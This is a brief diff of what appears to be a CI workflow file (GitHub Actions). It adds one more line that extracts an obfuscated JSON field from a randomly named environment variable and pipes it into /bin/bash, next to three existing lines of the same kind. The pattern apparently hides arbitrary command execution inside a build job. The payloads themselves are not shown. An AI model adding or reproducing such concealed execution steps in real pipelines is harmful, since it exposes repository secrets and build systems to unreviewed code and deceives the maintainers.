@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$tx15740" | jq -r .bsxch6116 | /bin/bash
           printf '%s' "$np81049" | jq -r .e0 | /bin/bash
           echo $rxfct7 | jq -r .yifm7 | /bin/bash
+          echo $bo94 | jq -r .qo2010 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
